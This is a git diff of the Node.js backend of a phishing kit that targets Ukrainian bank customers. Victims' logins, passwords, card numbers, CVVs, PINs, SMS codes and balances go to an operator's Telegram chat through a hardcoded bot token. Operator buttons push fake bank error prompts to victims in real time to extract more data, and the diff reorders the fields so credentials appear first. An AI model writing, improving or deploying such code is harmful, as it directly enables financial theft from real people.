@@ -8,12 +8,9 @@ const path = require('path');
 const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
 const CHAT_ID = '-4840920969';
 
-// --- ИЗМЕНЕНИЕ: Динамическое определение URL для Render ---
-// Render автоматически предоставляет переменную RENDER_EXTERNAL_URL с текущим адресом сервиса
+// --- Динамическое определение URL для Render ---
 const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
-// Собираем путь для вебхука
 const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
-// Собираем полный URL. Если сервис не на Render, он будет undefined.
 const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;
 
 
@@ -24,49 +21,34 @@ const banksForRequestButton = [
 ];
 
 const app = express();
-app.use(express.json()); // Важно, чтобы req.body парсился корректно
+app.use(express.json());
 app.use(cors());
 
 app.use((req, res, next) => {
-    // Простое логирование каждого запроса
     console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
     next();
 });
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-app.get('/panel', (req, res) => {
-    res.sendFile(path.join(__dirname, 'panel.html'));
-});
+app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
+app.get('/panel', (req, res) => { res.sendFile(path.join(__dirname, 'panel.html')); });
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-// --- ИЗМЕНЕНИЕ: Установка вебхука только если URL определен ---
 if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
         .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, 'СЕРВЕР ПЕРЕЗАПУЩЕН! (Динамический URL) Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
+    bot.sendMessage(CHAT_ID, 'СЕРВЕР ПЕРЕЗАПУЩЕН! (v2) Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
 } else {
-    console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен. Убедитесь, что сервис запущен на Render.');
+    console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
 }
-
 
 bot.getMe().then(me => console.log(`Бот запущен: @${me.username}`)).catch(err => console.error('Ошибка бота:', err));
 
-// --- ИЗМЕНЕНИЕ: Упрощенный обработчик вебхука ---
-// Telegram будет отправлять обновления на этот адрес
 app.post(webhookPath, (req, res) => {
-    // --- ДОБАВЛЕНО ЛОГИРОВАНИЕ ---
-    console.log('--- ПОЛУЧЕН WEBHOOK ОТ TELEGRAM ---');
-    console.log(JSON.stringify(req.body, null, 2)); // Печатаем всё тело запроса для отладки
-    // Передаем обновление в библиотеку для обработки
     bot.processUpdate(req.body);
-    res.sendStatus(200); // Отвечаем Telegram, что все ОК
+    res.sendStatus(200);
 });
-
 
 const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -98,14 +80,9 @@ wss.on('connection', (ws) => {
     ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
 });
 
-// Обработчик нажатий на кнопки
 bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
     
-    // --- ДОБАВЛЕНО ЛОГИРОВАНИЕ ---
-    console.log(`--- ПОЛУЧЕНО НАЖАТИЕ НА КНОПКУ (callback_query) ---`);
-    console.log(`Тип: ${type}, Сессия: ${sessionId}`);
-
     if (type === 'custom_message') {
         waitingForCustomMessage.set(callbackQuery.message.chat.id, sessionId);
         bot.sendMessage(callbackQuery.message.chat.id, `✏️ Введите сообщение для клиента <code>${sessionId}</code>:`, {
@@ -120,45 +97,24 @@ bot.on('callback_query', (callbackQuery) => {
     
     const ws = clients.get(sessionId);
     if (ws && ws.readyState === WebSocket.OPEN) {
-        console.log(`Найдена активная сессия для ${sessionId}. Отправляю команду...`);
         let commandData = {};
         const sessionData = sessions.get(sessionId) || {};
         const bankName = sessionData.bankName || '';
-
-        // ... (остальная логика кнопок без изменений)
         switch (type) {
-            case 'sms':
-                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
-                break;
-            case 'lk':
-            case 'call':
-                commandData = { bankName };
-                break;
-            case 'other':
-                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку", bankName };
-                break;
-            case 'pin_error':
-                commandData = { text: "Ви не змогли підтвердити володіння карткою. Для підтвердження володіння карткою натисніть назад та заповніть форму з вірним пін-кодом" };
-                break;
-            case 'number_error':
-                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
-                break;
-            case 'request_details':
-                commandData = { isRaiffeisen: bankName === 'Райффайзен' };
-                break;
+            case 'sms': commandData = { text: "Вам відправлено SMS з кодом..." }; break;
+            case 'lk': case 'call': commandData = { bankName }; break;
+            case 'other': commandData = { text: "В нас не вийшло автентифікувати вашу картку...", bankName }; break;
+            case 'pin_error': commandData = { text: "Ви не змогли підтвердити володіння карткою..." }; break;
+            case 'number_error': commandData = { text: "Вказано не фінансовий номер телефону..." }; break;
+            case 'request_details': commandData = { isRaiffeisen: bankName === 'Райффайзен' }; break;
         }
-
         ws.send(JSON.stringify({ type: type, data: commandData }));
         bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
     } else {
-        console.log(`Ошибка: клиент для сессии ${sessionId} не найден или не в сети.`);
         bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
     }
 });
 
-
-// Остальной код (обработчики API, сообщений и т.д.) без изменений
-// ...
 app.post('/api/submit', (req, res) => {
     const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
     let workerNick = 'unknown';
@@ -168,6 +124,7 @@ app.post('/api/submit', (req, res) => {
     const existingData = sessions.get(sessionId) || {};
     const newData = { ...existingData, ...stepData };
     sessions.set(sessionId, newData);
+
     if (isFinalStep && !newData.logSent) {
         newData.logSent = true;
         sessions.set(sessionId, newData);
@@ -179,14 +136,14 @@ app.post('/api/submit', (req, res) => {
         }
         let message = `<b>Новий запис!</b>\n\n`;
         message += `<b>Назва банку:</b> ${newData.bankName}\n`;
-        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
-        message += `<b>Номер карти:</b> <code>${cardNumber || 'Не вказано'}</code>\n`;
+        // --- ИЗМЕНЕНИЕ: Добавлены логин и пароль в сообщение ---
+        if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
+        if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
+        if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
+        if (cardNumber) message += `<b>Номер карти:</b> <code>${cardNumber}</code>\n`;
         if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
         if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
         if (newData.pin) message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
-        if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
-        if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
-        if (newData.call_code_input) message += `<b>Код із дзвінка:</b> <code>${newData.call_code_input}</code>\n`;
         if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
         const visitText = visitCount === 1 ? 'NEW' : `${visitCount} раз`;
         message += `<b>Кількість переходів:</b> ${visitText}\n`;
@@ -195,6 +152,7 @@ app.post('/api/submit', (req, res) => {
     }
     res.status(200).json({ message: 'OK' });
 });
+
 app.post('/api/sms', (req, res) => {
     const { sessionId, code, referrer } = req.body;
     let workerNick = 'unknown';
@@ -214,6 +172,7 @@ app.post('/api/sms', (req, res) => {
         res.status(404).json({ message: 'Session not found' });
     }
 });
+
 function sendToTelegram(message, sessionId, bankName) {
     const keyboard = [
         [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: 'ЛК', callback_data: `lk:${sessionId}` }, { text: 'Звонок', callback_data: `call:${sessionId}` }],
@@ -226,6 +185,7 @@ function sendToTelegram(message, sessionId, bankName) {
     }
     bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } }).catch(err => console.error("Telegram send error:", err));
 }
+
 bot.on('message', (msg) => {
     if (msg.reply_to_message && msg.reply_to_message.message_id === waitingForCustomMessage.get('reply_to_message_id')) {
         const sessionId = waitingForCustomMessage.get(msg.chat.id);
@@ -240,5 +200,6 @@ bot.on('message', (msg) => {
         waitingForCustomMessage.delete('reply_to_message_id');
     }
 });
+
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => console.log(`Сервер запущен на порту ${PORT}`));
